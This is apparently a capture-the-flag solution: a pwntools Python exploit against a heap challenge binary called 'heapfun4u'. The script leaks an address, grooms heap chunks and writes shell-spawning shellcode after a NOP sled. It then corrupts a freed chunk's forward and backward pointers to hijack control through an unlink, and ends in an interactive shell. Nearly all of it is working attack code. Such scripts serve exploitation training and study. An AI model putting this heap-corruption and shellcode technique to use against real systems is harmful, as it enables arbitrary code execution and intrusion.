#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"
#context.log_level = "info"

chall = "./heapfun4u"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        # before write
        b *0x40082a
        # after write
        b *0x400904
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def alloc(size):
    p.recvuntil("|")
    p.sendline('A')
    p.recvuntil("Size:")
    p.sendline(str(size))
    log.info("allocated: size = {}".format(size))

def free(index):
    p.recvuntil("|")
    p.sendline('F')
    p.recvuntil("Index:")
    p.sendline(str(index))
    log.info("free: index = {}".format(index))

def write(index, buffer):
    p.recvuntil("|")
    p.sendline('W')
    p.recvuntil("Write where:")
    p.sendline(str(index))
    p.recvuntil("Write what:")
    p.send(buffer)
    log.info("write: index = {}".format(index))

def niceguy():
    p.recvuntil("|")
    p.sendline('N')
    p.recvuntil("Here you go: ")
    return eval(p.recv(14))

def exit_main():
    p.recvuntil("|")
    p.sendline('E')


# heap chunk struct(freed)
# +-------------+ 
# | chunk size  | # at last one bit is using for check use or free
# +-------------+
# |    buffer   | # buffer - 16 byte
# +-------------+
# |   backward  | # 8byte
# +-------------+
# |   forward   | # 8byte
# +-------------+

# get nice address
leak = niceguy()
log.info("leak: 0x{:08x}".format(leak))
main_ret = leak + 0x13c
log.info("main ret: 0x{:08x}".format(main_ret))

# alloc && free some chunks
alloc(0x80)# 1
alloc(0x50)# 2
alloc(0x20)# 3
alloc(0x20)# 4
alloc(0x20)# 5
free(2)# write shellcode && unlink
free(4)# 

# get 1st chunk address && write shellcode
shellcode = asm(shellcraft.sh())
print(len(shellcode))
p.sendline('W')
p.recvuntil("1) ")
shellcode_chunk = eval(p.recv(14))
log.info("shellcode chunk: 0x{:08x}".format(shellcode_chunk))
p.recvuntil("Write where:")
p.sendline(b'1')
p.recvuntil("Write what:")
p.sendline(shellcode)

# get 4th chunk adderss
p.recvuntil("|")
p.sendline('W')
p.recvuntil("4) ")
four_chunk = eval(p.recv(14))
log.info("4th chunk: 0x{:08x}".format(four_chunk))
p.recvuntil("Write where:")
p.sendline(b'4')
p.recvuntil("Write what:")
p.send(b'A')

# overwrite fd & bk @ chunk 2
payload = p8(0x90) * (0x40 - len(shellcode))# buffer
payload += shellcode
payload += p64(shellcode_chunk)# bk
payload += p64(four_chunk)# fd
write(2, payload)

# dummy chunk
payload = p64(main_ret - four_chunk + 0x8)
#write(4, payload)

alloc(0x50)
exit_main()

p.interactive()
